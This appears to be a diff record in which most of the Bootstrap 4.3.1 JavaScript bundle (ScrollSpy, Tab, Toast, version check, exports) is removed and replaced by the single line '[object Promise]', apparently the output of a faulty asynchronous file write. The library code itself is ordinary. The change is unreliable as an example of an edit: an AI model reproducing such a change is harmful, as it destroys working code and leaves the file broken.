// Removed at line 3034:           var targetSelector = Util.getSelectorFromElement(element);
// Removed at line 3035:           if (targetSelector) {
// Removed at line 3036:             target = document.querySelector(targetSelector);
// Removed at line 3037:           }
// Removed at line 3038:           if (target) {
// Removed at line 3039:             var targetBCR = target.getBoundingClientRect();
// Removed at line 3040:             if (targetBCR.width || targetBCR.height) {
// Removed at line 3041:               // TODO (fat): remove sketch reliance on jQuery position/offset
// Removed at line 3042:               return [$(target)[offsetMethod]().top + offsetBase, targetSelector];
// Removed at line 3043:             }
// Removed at line 3044:           }
// Removed at line 3045:           return null;
// Removed at line 3046:         }).filter(function (item) {
// Removed at line 3047:           return item;
// Removed at line 3048:         }).sort(function (a, b) {
// Removed at line 3049:           return a[0] - b[0];
// Removed at line 3050:         }).forEach(function (item) {
// Removed at line 3051:           _this2._offsets.push(item[0]);
// Removed at line 3052:           _this2._targets.push(item[1]);
// Removed at line 3053:         });
// Removed at line 3054:       };
// Removed at line 3055:       _proto.dispose = function dispose() {
// Removed at line 3056:         $.removeData(this._element, DATA_KEY$8);
// Removed at line 3057:         $(this._scrollElement).off(EVENT_KEY$8);
// Removed at line 3058:         this._element = null;
// Removed at line 3059:         this._scrollElement = null;
// Removed at line 3060:         this._config = null;
// Removed at line 3061:         this._selector = null;
// Removed at line 3062:         this._offsets = null;
// Removed at line 3063:         this._targets = null;
// Removed at line 3064:         this._activeTarget = null;
// Removed at line 3065:         this._scrollHeight = null;
// Removed at line 3066:       } // Private
// Removed at line 3067:         ;
// Removed at line 3068:       _proto._getConfig = function _getConfig(config) {
// Removed at line 3069:         config = _objectSpread({}, Default$6, typeof config === 'object' && config ? config : {});
// Removed at line 3070:         if (typeof config.target !== 'string') {
// Removed at line 3071:           var id = $(config.target).attr('id');
// Removed at line 3072:           if (!id) {
// Removed at line 3073:             id = Util.getUID(NAME$8);
// Removed at line 3074:             $(config.target).attr('id', id);
// Removed at line 3075:           }
// Removed at line 3076:           config.target = "#" + id;
// Removed at line 3077:         }
// Removed at line 3078:         Util.typeCheckConfig(NAME$8, config, DefaultType$6);
// Removed at line 3079:         return config;
// Removed at line 3080:       };
// Removed at line 3081:       _proto._getScrollTop = function _getScrollTop() {
// Removed at line 3082:         return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
// Removed at line 3083:       };
// Removed at line 3084:       _proto._getScrollHeight = function _getScrollHeight() {
// Removed at line 3085:         return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
// Removed at line 3086:       };
// Removed at line 3087:       _proto._getOffsetHeight = function _getOffsetHeight() {
// Removed at line 3088:         return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
// Removed at line 3089:       };
// Removed at line 3090:       _proto._process = function _process() {
// Removed at line 3091:         var scrollTop = this._getScrollTop() + this._config.offset;
// Removed at line 3092:         var scrollHeight = this._getScrollHeight();
// Removed at line 3093:         var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();
// Removed at line 3094:         if (this._scrollHeight !== scrollHeight) {
// Removed at line 3095:           this.refresh();
// Removed at line 3096:         }
// Removed at line 3097:         if (scrollTop >= maxScroll) {
// Removed at line 3098:           var target = this._targets[this._targets.length - 1];
// Removed at line 3099:           if (this._activeTarget !== target) {
// Removed at line 3100:             this._activate(target);
// Removed at line 3101:           }
// Removed at line 3102:           return;
// Removed at line 3103:         }
// Removed at line 3104:         if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
// Removed at line 3105:           this._activeTarget = null;
// Removed at line 3106:           this._clear();
// Removed at line 3107:           return;
// Removed at line 3108:         }
// Removed at line 3109:         var offsetLength = this._offsets.length;
// Removed at line 3110:         for (var i = offsetLength; i--;) {
// Removed at line 3111:           var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);
// Removed at line 3112:           if (isActiveTarget) {
// Removed at line 3113:             this._activate(this._targets[i]);
// Removed at line 3114:           }
// Removed at line 3115:         }
// Removed at line 3116:       };
// Removed at line 3117:       _proto._activate = function _activate(target) {
// Removed at line 3118:         this._activeTarget = target;
// Removed at line 3119:         this._clear();
// Removed at line 3120:         var queries = this._selector.split(',').map(function (selector) {
// Removed at line 3121:           return selector + "[data-target=\"" + target + "\"]," + selector + "[href=\"" + target + "\"]";
// Removed at line 3122:         });
// Removed at line 3123:         var $link = $([].slice.call(document.querySelectorAll(queries.join(','))));
// Removed at line 3124:         if ($link.hasClass(ClassName$8.DROPDOWN_ITEM)) {
// Removed at line 3125:           $link.closest(Selector$8.DROPDOWN).find(Selector$8.DROPDOWN_TOGGLE).addClass(ClassName$8.ACTIVE);
// Removed at line 3126:           $link.addClass(ClassName$8.ACTIVE);
// Removed at line 3127:         } else {
// Removed at line 3128:           // Set triggered link as active
// Removed at line 3129:           $link.addClass(ClassName$8.ACTIVE); // Set triggered links parents as active
// Removed at line 3130:           // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor
// Removed at line 3131:           $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_LINKS + ", " + Selector$8.LIST_ITEMS).addClass(ClassName$8.ACTIVE); // Handle special case when .nav-link is inside .nav-item
// Removed at line 3132:           $link.parents(Selector$8.NAV_LIST_GROUP).prev(Selector$8.NAV_ITEMS).children(Selector$8.NAV_LINKS).addClass(ClassName$8.ACTIVE);
// Removed at line 3133:         }
// Removed at line 3134:         $(this._scrollElement).trigger(Event$8.ACTIVATE, {
// Removed at line 3135:           relatedTarget: target
// Removed at line 3136:         });
// Removed at line 3137:       };
// Removed at line 3138:       _proto._clear = function _clear() {
// Removed at line 3139:         [].slice.call(document.querySelectorAll(this._selector)).filter(function (node) {
// Removed at line 3140:           return node.classList.contains(ClassName$8.ACTIVE);
// Removed at line 3141:         }).forEach(function (node) {
// Removed at line 3142:           return node.classList.remove(ClassName$8.ACTIVE);
// Removed at line 3143:         });
// Removed at line 3144:       } // Static
// Removed at line 3145:         ;
// Removed at line 3146:       ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 3147:         return this.each(function () {
// Removed at line 3148:           var data = $(this).data(DATA_KEY$8);
// Removed at line 3149:           var _config = typeof config === 'object' && config;
// Removed at line 3150:           if (!data) {
// Removed at line 3151:             data = new ScrollSpy(this, _config);
// Removed at line 3152:             $(this).data(DATA_KEY$8, data);
// Removed at line 3153:           }
// Removed at line 3154:           if (typeof config === 'string') {
// Removed at line 3155:             if (typeof data[config] === 'undefined') {
// Removed at line 3156:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 3157:             }
// Removed at line 3158:             data[config]();
// Removed at line 3159:           }
// Removed at line 3160:         });
// Removed at line 3161:       };
// Removed at line 3162:       _createClass(ScrollSpy, null, [{
// Removed at line 3163:         key: "VERSION",
// Removed at line 3164:         get: function get() {
// Removed at line 3165:           return VERSION$8;
// Removed at line 3166:         }
// Removed at line 3167:       }, {
// Removed at line 3168:         key: "Default",
// Removed at line 3169:         get: function get() {
// Removed at line 3170:           return Default$6;
// Removed at line 3171:         }
// Removed at line 3172:       }]);
// Removed at line 3173:       return ScrollSpy;
// Removed at line 3174:     }();
// Removed at line 3175:   /**
// Removed at line 3176:    * ------------------------------------------------------------------------
// Removed at line 3177:    * Data Api implementation
// Removed at line 3178:    * ------------------------------------------------------------------------
// Removed at line 3179:    */
// Removed at line 3180:   $(window).on(Event$8.LOAD_DATA_API, function () {
// Removed at line 3181:     var scrollSpys = [].slice.call(document.querySelectorAll(Selector$8.DATA_SPY));
// Removed at line 3182:     var scrollSpysLength = scrollSpys.length;
// Removed at line 3183:     for (var i = scrollSpysLength; i--;) {
// Removed at line 3184:       var $spy = $(scrollSpys[i]);
// Removed at line 3185:       ScrollSpy._jQueryInterface.call($spy, $spy.data());
// Removed at line 3186:     }
// Removed at line 3187:   });
// Removed at line 3188:   /**
// Removed at line 3189:    * ------------------------------------------------------------------------
// Removed at line 3190:    * jQuery
// Removed at line 3191:    * ------------------------------------------------------------------------
// Removed at line 3192:    */
// Removed at line 3193:   $.fn[NAME$8] = ScrollSpy._jQueryInterface;
// Removed at line 3194:   $.fn[NAME$8].Constructor = ScrollSpy;
// Removed at line 3195:   $.fn[NAME$8].noConflict = function () {
// Removed at line 3196:     $.fn[NAME$8] = JQUERY_NO_CONFLICT$8;
// Removed at line 3197:     return ScrollSpy._jQueryInterface;
// Removed at line 3198:   };
// Removed at line 3199:   /**
// Removed at line 3200:    * ------------------------------------------------------------------------
// Removed at line 3201:    * Constants
// Removed at line 3202:    * ------------------------------------------------------------------------
// Removed at line 3203:    */
// Removed at line 3204:   var NAME$9 = 'tab';
// Removed at line 3205:   var VERSION$9 = '4.3.1';
// Removed at line 3206:   var DATA_KEY$9 = 'bs.tab';
// Removed at line 3207:   var EVENT_KEY$9 = "." + DATA_KEY$9;
// Removed at line 3208:   var DATA_API_KEY$7 = '.data-api';
// Removed at line 3209:   var JQUERY_NO_CONFLICT$9 = $.fn[NAME$9];
// Removed at line 3210:   var Event$9 = {
// Removed at line 3211:     HIDE: "hide" + EVENT_KEY$9,
// Removed at line 3212:     HIDDEN: "hidden" + EVENT_KEY$9,
// Removed at line 3213:     SHOW: "show" + EVENT_KEY$9,
// Removed at line 3214:     SHOWN: "shown" + EVENT_KEY$9,
// Removed at line 3215:     CLICK_DATA_API: "click" + EVENT_KEY$9 + DATA_API_KEY$7
// Removed at line 3216:   };
// Removed at line 3217:   var ClassName$9 = {
// Removed at line 3218:     DROPDOWN_MENU: 'dropdown-menu',
// Removed at line 3219:     ACTIVE: 'active',
// Removed at line 3220:     DISABLED: 'disabled',
// Removed at line 3221:     FADE: 'fade',
// Removed at line 3222:     SHOW: 'show'
// Removed at line 3223:   };
// Removed at line 3224:   var Selector$9 = {
// Removed at line 3225:     DROPDOWN: '.dropdown',
// Removed at line 3226:     NAV_LIST_GROUP: '.nav, .list-group',
// Removed at line 3227:     ACTIVE: '.active',
// Removed at line 3228:     ACTIVE_UL: '> li > .active',
// Removed at line 3229:     DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
// Removed at line 3230:     DROPDOWN_TOGGLE: '.dropdown-toggle',
// Removed at line 3231:     DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'
// Removed at line 3232:     /**
// Removed at line 3233:      * ------------------------------------------------------------------------
// Removed at line 3234:      * Class Definition
// Removed at line 3235:      * ------------------------------------------------------------------------
// Removed at line 3236:      */
// Removed at line 3237:   };
// Removed at line 3238:   var Tab =
// Removed at line 3239:     /*#__PURE__*/
// Removed at line 3240:     function () {
// Removed at line 3241:       function Tab(element) {
// Removed at line 3242:         this._element = element;
// Removed at line 3243:       } // Getters
// Removed at line 3244:       var _proto = Tab.prototype;
// Removed at line 3245:       // Public
// Removed at line 3246:       _proto.show = function show() {
// Removed at line 3247:         var _this = this;
// Removed at line 3248:         if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && $(this._element).hasClass(ClassName$9.ACTIVE) || $(this._element).hasClass(ClassName$9.DISABLED)) {
// Removed at line 3249:           return;
// Removed at line 3250:         }
// Removed at line 3251:         var target;
// Removed at line 3252:         var previous;
// Removed at line 3253:         var listElement = $(this._element).closest(Selector$9.NAV_LIST_GROUP)[0];
// Removed at line 3254:         var selector = Util.getSelectorFromElement(this._element);
// Removed at line 3255:         if (listElement) {
// Removed at line 3256:           var itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? Selector$9.ACTIVE_UL : Selector$9.ACTIVE;
// Removed at line 3257:           previous = $.makeArray($(listElement).find(itemSelector));
// Removed at line 3258:           previous = previous[previous.length - 1];
// Removed at line 3259:         }
// Removed at line 3260:         var hideEvent = $.Event(Event$9.HIDE, {
// Removed at line 3261:           relatedTarget: this._element
// Removed at line 3262:         });
// Removed at line 3263:         var showEvent = $.Event(Event$9.SHOW, {
// Removed at line 3264:           relatedTarget: previous
// Removed at line 3265:         });
// Removed at line 3266:         if (previous) {
// Removed at line 3267:           $(previous).trigger(hideEvent);
// Removed at line 3268:         }
// Removed at line 3269:         $(this._element).trigger(showEvent);
// Removed at line 3270:         if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {
// Removed at line 3271:           return;
// Removed at line 3272:         }
// Removed at line 3273:         if (selector) {
// Removed at line 3274:           target = document.querySelector(selector);
// Removed at line 3275:         }
// Removed at line 3276:         this._activate(this._element, listElement);
// Removed at line 3277:         var complete = function complete() {
// Removed at line 3278:           var hiddenEvent = $.Event(Event$9.HIDDEN, {
// Removed at line 3279:             relatedTarget: _this._element
// Removed at line 3280:           });
// Removed at line 3281:           var shownEvent = $.Event(Event$9.SHOWN, {
// Removed at line 3282:             relatedTarget: previous
// Removed at line 3283:           });
// Removed at line 3284:           $(previous).trigger(hiddenEvent);
// Removed at line 3285:           $(_this._element).trigger(shownEvent);
// Removed at line 3286:         };
// Removed at line 3287:         if (target) {
// Removed at line 3288:           this._activate(target, target.parentNode, complete);
// Removed at line 3289:         } else {
// Removed at line 3290:           complete();
// Removed at line 3291:         }
// Removed at line 3292:       };
// Removed at line 3293:       _proto.dispose = function dispose() {
// Removed at line 3294:         $.removeData(this._element, DATA_KEY$9);
// Removed at line 3295:         this._element = null;
// Removed at line 3296:       } // Private
// Removed at line 3297:         ;
// Removed at line 3298:       _proto._activate = function _activate(element, container, callback) {
// Removed at line 3299:         var _this2 = this;
// Removed at line 3300:         var activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? $(container).find(Selector$9.ACTIVE_UL) : $(container).children(Selector$9.ACTIVE);
// Removed at line 3301:         var active = activeElements[0];
// Removed at line 3302:         var isTransitioning = callback && active && $(active).hasClass(ClassName$9.FADE);
// Removed at line 3303:         var complete = function complete() {
// Removed at line 3304:           return _this2._transitionComplete(element, active, callback);
// Removed at line 3305:         };
// Removed at line 3306:         if (active && isTransitioning) {
// Removed at line 3307:           var transitionDuration = Util.getTransitionDurationFromElement(active);
// Removed at line 3308:           $(active).removeClass(ClassName$9.SHOW).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 3309:         } else {
// Removed at line 3310:           complete();
// Removed at line 3311:         }
// Removed at line 3312:       };
// Removed at line 3313:       _proto._transitionComplete = function _transitionComplete(element, active, callback) {
// Removed at line 3314:         if (active) {
// Removed at line 3315:           $(active).removeClass(ClassName$9.ACTIVE);
// Removed at line 3316:           var dropdownChild = $(active.parentNode).find(Selector$9.DROPDOWN_ACTIVE_CHILD)[0];
// Removed at line 3317:           if (dropdownChild) {
// Removed at line 3318:             $(dropdownChild).removeClass(ClassName$9.ACTIVE);
// Removed at line 3319:           }
// Removed at line 3320:           if (active.getAttribute('role') === 'tab') {
// Removed at line 3321:             active.setAttribute('aria-selected', false);
// Removed at line 3322:           }
// Removed at line 3323:         }
// Removed at line 3324:         $(element).addClass(ClassName$9.ACTIVE);
// Removed at line 3325:         if (element.getAttribute('role') === 'tab') {
// Removed at line 3326:           element.setAttribute('aria-selected', true);
// Removed at line 3327:         }
// Removed at line 3328:         Util.reflow(element);
// Removed at line 3329:         if (element.classList.contains(ClassName$9.FADE)) {
// Removed at line 3330:           element.classList.add(ClassName$9.SHOW);
// Removed at line 3331:         }
// Removed at line 3332:         if (element.parentNode && $(element.parentNode).hasClass(ClassName$9.DROPDOWN_MENU)) {
// Removed at line 3333:           var dropdownElement = $(element).closest(Selector$9.DROPDOWN)[0];
// Removed at line 3334:           if (dropdownElement) {
// Removed at line 3335:             var dropdownToggleList = [].slice.call(dropdownElement.querySelectorAll(Selector$9.DROPDOWN_TOGGLE));
// Removed at line 3336:             $(dropdownToggleList).addClass(ClassName$9.ACTIVE);
// Removed at line 3337:           }
// Removed at line 3338:           element.setAttribute('aria-expanded', true);
// Removed at line 3339:         }
// Removed at line 3340:         if (callback) {
// Removed at line 3341:           callback();
// Removed at line 3342:         }
// Removed at line 3343:       } // Static
// Removed at line 3344:         ;
// Removed at line 3345:       Tab._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 3346:         return this.each(function () {
// Removed at line 3347:           var $this = $(this);
// Removed at line 3348:           var data = $this.data(DATA_KEY$9);
// Removed at line 3349:           if (!data) {
// Removed at line 3350:             data = new Tab(this);
// Removed at line 3351:             $this.data(DATA_KEY$9, data);
// Removed at line 3352:           }
// Removed at line 3353:           if (typeof config === 'string') {
// Removed at line 3354:             if (typeof data[config] === 'undefined') {
// Removed at line 3355:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 3356:             }
// Removed at line 3357:             data[config]();
// Removed at line 3358:           }
// Removed at line 3359:         });
// Removed at line 3360:       };
// Removed at line 3361:       _createClass(Tab, null, [{
// Removed at line 3362:         key: "VERSION",
// Removed at line 3363:         get: function get() {
// Removed at line 3364:           return VERSION$9;
// Removed at line 3365:         }
// Removed at line 3366:       }]);
// Removed at line 3367:       return Tab;
// Removed at line 3368:     }();
// Removed at line 3369:   /**
// Removed at line 3370:    * ------------------------------------------------------------------------
// Removed at line 3371:    * Data Api implementation
// Removed at line 3372:    * ------------------------------------------------------------------------
// Removed at line 3373:    */
// Removed at line 3374:   $(document).on(Event$9.CLICK_DATA_API, Selector$9.DATA_TOGGLE, function (event) {
// Removed at line 3375:     event.preventDefault();
// Removed at line 3376:     Tab._jQueryInterface.call($(this), 'show');
// Removed at line 3377:   });
// Removed at line 3378:   /**
// Removed at line 3379:    * ------------------------------------------------------------------------
// Removed at line 3380:    * jQuery
// Removed at line 3381:    * ------------------------------------------------------------------------
// Removed at line 3382:    */
// Removed at line 3383:   $.fn[NAME$9] = Tab._jQueryInterface;
// Removed at line 3384:   $.fn[NAME$9].Constructor = Tab;
// Removed at line 3385:   $.fn[NAME$9].noConflict = function () {
// Removed at line 3386:     $.fn[NAME$9] = JQUERY_NO_CONFLICT$9;
// Removed at line 3387:     return Tab._jQueryInterface;
// Removed at line 3388:   };
// Removed at line 3389:   /**
// Removed at line 3390:    * ------------------------------------------------------------------------
// Removed at line 3391:    * Constants
// Removed at line 3392:    * ------------------------------------------------------------------------
// Removed at line 3393:    */
// Removed at line 3394:   var NAME$a = 'toast';
// Removed at line 3395:   var VERSION$a = '4.3.1';
// Removed at line 3396:   var DATA_KEY$a = 'bs.toast';
// Removed at line 3397:   var EVENT_KEY$a = "." + DATA_KEY$a;
// Removed at line 3398:   var JQUERY_NO_CONFLICT$a = $.fn[NAME$a];
// Removed at line 3399:   var Event$a = {
// Removed at line 3400:     CLICK_DISMISS: "click.dismiss" + EVENT_KEY$a,
// Removed at line 3401:     HIDE: "hide" + EVENT_KEY$a,
// Removed at line 3402:     HIDDEN: "hidden" + EVENT_KEY$a,
// Removed at line 3403:     SHOW: "show" + EVENT_KEY$a,
// Removed at line 3404:     SHOWN: "shown" + EVENT_KEY$a
// Removed at line 3405:   };
// Removed at line 3406:   var ClassName$a = {
// Removed at line 3407:     FADE: 'fade',
// Removed at line 3408:     HIDE: 'hide',
// Removed at line 3409:     SHOW: 'show',
// Removed at line 3410:     SHOWING: 'showing'
// Removed at line 3411:   };
// Removed at line 3412:   var DefaultType$7 = {
// Removed at line 3413:     animation: 'boolean',
// Removed at line 3414:     autohide: 'boolean',
// Removed at line 3415:     delay: 'number'
// Removed at line 3416:   };
// Removed at line 3417:   var Default$7 = {
// Removed at line 3418:     animation: true,
// Removed at line 3419:     autohide: true,
// Removed at line 3420:     delay: 500
// Removed at line 3421:   };
// Removed at line 3422:   var Selector$a = {
// Removed at line 3423:     DATA_DISMISS: '[data-dismiss="toast"]'
// Removed at line 3424:     /**
// Removed at line 3425:      * ------------------------------------------------------------------------
// Removed at line 3426:      * Class Definition
// Removed at line 3427:      * ------------------------------------------------------------------------
// Removed at line 3428:      */
// Removed at line 3429:   };
// Removed at line 3430:   var Toast =
// Removed at line 3431:     /*#__PURE__*/
// Removed at line 3432:     function () {
// Removed at line 3433:       function Toast(element, config) {
// Removed at line 3434:         this._element = element;
// Removed at line 3435:         this._config = this._getConfig(config);
// Removed at line 3436:         this._timeout = null;
// Removed at line 3437:         this._setListeners();
// Removed at line 3438:       } // Getters
// Removed at line 3439:       var _proto = Toast.prototype;
// Removed at line 3440:       // Public
// Removed at line 3441:       _proto.show = function show() {
// Removed at line 3442:         var _this = this;
// Removed at line 3443:         $(this._element).trigger(Event$a.SHOW);
// Removed at line 3444:         if (this._config.animation) {
// Removed at line 3445:           this._element.classList.add(ClassName$a.FADE);
// Removed at line 3446:         }
// Removed at line 3447:         var complete = function complete() {
// Removed at line 3448:           _this._element.classList.remove(ClassName$a.SHOWING);
// Removed at line 3449:           _this._element.classList.add(ClassName$a.SHOW);
// Removed at line 3450:           $(_this._element).trigger(Event$a.SHOWN);
// Removed at line 3451:           if (_this._config.autohide) {
// Removed at line 3452:             _this.hide();
// Removed at line 3453:           }
// Removed at line 3454:         };
// Removed at line 3455:         this._element.classList.remove(ClassName$a.HIDE);
// Removed at line 3456:         this._element.classList.add(ClassName$a.SHOWING);
// Removed at line 3457:         if (this._config.animation) {
// Removed at line 3458:           var transitionDuration = Util.getTransitionDurationFromElement(this._element);
// Removed at line 3459:           $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 3460:         } else {
// Removed at line 3461:           complete();
// Removed at line 3462:         }
// Removed at line 3463:       };
// Removed at line 3464:       _proto.hide = function hide(withoutTimeout) {
// Removed at line 3465:         var _this2 = this;
// Removed at line 3466:         if (!this._element.classList.contains(ClassName$a.SHOW)) {
// Removed at line 3467:           return;
// Removed at line 3468:         }
// Removed at line 3469:         $(this._element).trigger(Event$a.HIDE);
// Removed at line 3470:         if (withoutTimeout) {
// Removed at line 3471:           this._close();
// Removed at line 3472:         } else {
// Removed at line 3473:           this._timeout = setTimeout(function () {
// Removed at line 3474:             _this2._close();
// Removed at line 3475:           }, this._config.delay);
// Removed at line 3476:         }
// Removed at line 3477:       };
// Removed at line 3478:       _proto.dispose = function dispose() {
// Removed at line 3479:         clearTimeout(this._timeout);
// Removed at line 3480:         this._timeout = null;
// Removed at line 3481:         if (this._element.classList.contains(ClassName$a.SHOW)) {
// Removed at line 3482:           this._element.classList.remove(ClassName$a.SHOW);
// Removed at line 3483:         }
// Removed at line 3484:         $(this._element).off(Event$a.CLICK_DISMISS);
// Removed at line 3485:         $.removeData(this._element, DATA_KEY$a);
// Removed at line 3486:         this._element = null;
// Removed at line 3487:         this._config = null;
// Removed at line 3488:       } // Private
// Removed at line 3489:         ;
// Removed at line 3490:       _proto._getConfig = function _getConfig(config) {
// Removed at line 3491:         config = _objectSpread({}, Default$7, $(this._element).data(), typeof config === 'object' && config ? config : {});
// Removed at line 3492:         Util.typeCheckConfig(NAME$a, config, this.constructor.DefaultType);
// Removed at line 3493:         return config;
// Removed at line 3494:       };
// Removed at line 3495:       _proto._setListeners = function _setListeners() {
// Removed at line 3496:         var _this3 = this;
// Removed at line 3497:         $(this._element).on(Event$a.CLICK_DISMISS, Selector$a.DATA_DISMISS, function () {
// Removed at line 3498:           return _this3.hide(true);
// Removed at line 3499:         });
// Removed at line 3500:       };
// Removed at line 3501:       _proto._close = function _close() {
// Removed at line 3502:         var _this4 = this;
// Removed at line 3503:         var complete = function complete() {
// Removed at line 3504:           _this4._element.classList.add(ClassName$a.HIDE);
// Removed at line 3505:           $(_this4._element).trigger(Event$a.HIDDEN);
// Removed at line 3506:         };
// Removed at line 3507:         this._element.classList.remove(ClassName$a.SHOW);
// Removed at line 3508:         if (this._config.animation) {
// Removed at line 3509:           var transitionDuration = Util.getTransitionDurationFromElement(this._element);
// Removed at line 3510:           $(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
// Removed at line 3511:         } else {
// Removed at line 3512:           complete();
// Removed at line 3513:         }
// Removed at line 3514:       } // Static
// Removed at line 3515:         ;
// Removed at line 3516:       Toast._jQueryInterface = function _jQueryInterface(config) {
// Removed at line 3517:         return this.each(function () {
// Removed at line 3518:           var $element = $(this);
// Removed at line 3519:           var data = $element.data(DATA_KEY$a);
// Removed at line 3520:           var _config = typeof config === 'object' && config;
// Removed at line 3521:           if (!data) {
// Removed at line 3522:             data = new Toast(this, _config);
// Removed at line 3523:             $element.data(DATA_KEY$a, data);
// Removed at line 3524:           }
// Removed at line 3525:           if (typeof config === 'string') {
// Removed at line 3526:             if (typeof data[config] === 'undefined') {
// Removed at line 3527:               throw new TypeError("No method named \"" + config + "\"");
// Removed at line 3528:             }
// Removed at line 3529:             data[config](this);
// Removed at line 3530:           }
// Removed at line 3531:         });
// Removed at line 3532:       };
// Removed at line 3533:       _createClass(Toast, null, [{
// Removed at line 3534:         key: "VERSION",
// Removed at line 3535:         get: function get() {
// Removed at line 3536:           return VERSION$a;
// Removed at line 3537:         }
// Removed at line 3538:       }, {
// Removed at line 3539:         key: "DefaultType",
// Removed at line 3540:         get: function get() {
// Removed at line 3541:           return DefaultType$7;
// Removed at line 3542:         }
// Removed at line 3543:       }, {
// Removed at line 3544:         key: "Default",
// Removed at line 3545:         get: function get() {
// Removed at line 3546:           return Default$7;
// Removed at line 3547:         }
// Removed at line 3548:       }]);
// Removed at line 3549:       return Toast;
// Removed at line 3550:     }();
// Removed at line 3551:   /**
// Removed at line 3552:    * ------------------------------------------------------------------------
// Removed at line 3553:    * jQuery
// Removed at line 3554:    * ------------------------------------------------------------------------
// Removed at line 3555:    */
// Removed at line 3556:   $.fn[NAME$a] = Toast._jQueryInterface;
// Removed at line 3557:   $.fn[NAME$a].Constructor = Toast;
// Removed at line 3558:   $.fn[NAME$a].noConflict = function () {
// Removed at line 3559:     $.fn[NAME$a] = JQUERY_NO_CONFLICT$a;
// Removed at line 3560:     return Toast._jQueryInterface;
// Removed at line 3561:   };
// Removed at line 3562:   /**
// Removed at line 3563:    * --------------------------------------------------------------------------
// Removed at line 3564:    * Bootstrap (v4.3.1): index.js
// Removed at line 3565:    * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
// Removed at line 3566:    * --------------------------------------------------------------------------
// Removed at line 3567:    */
// Removed at line 3568:   (function () {
// Removed at line 3569:     if (typeof $ === 'undefined') {
// Removed at line 3570:       throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');
// Removed at line 3571:     }
// Removed at line 3572:     var version = $.fn.jquery.split(' ')[0].split('.');
// Removed at line 3573:     var minMajor = 1;
// Removed at line 3574:     var ltMajor = 2;
// Removed at line 3575:     var minMinor = 9;
// Removed at line 3576:     var minPatch = 1;
// Removed at line 3577:     var maxMajor = 4;
// Removed at line 3578:     if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {
// Removed at line 3579:       throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');
// Removed at line 3580:     }
// Removed at line 3581:   })();
// Removed at line 3582:   exports.Util = Util;
// Removed at line 3583:   exports.Alert = Alert;
// Removed at line 3584:   exports.Button = Button;
// Removed at line 3585:   exports.Carousel = Carousel;
// Removed at line 3586:   exports.Collapse = Collapse;
// Removed at line 3587:   exports.Dropdown = Dropdown;
// Removed at line 3588:   exports.Modal = Modal;
// Removed at line 3589:   exports.Popover = Popover;
// Removed at line 3590:   exports.Scrollspy = ScrollSpy;
// Removed at line 3591:   exports.Tab = Tab;
// Removed at line 3592:   exports.Toast = Toast;
// Removed at line 3593:   exports.Tooltip = Tooltip;
// Removed at line 3594:   Object.defineProperty(exports, '__esModule', { value: true });
// Removed at line 3595: }));
// Removed at line 3596: //# sourceMappingURL=bootstrap.js.map
// Added at line 1: [object Promise]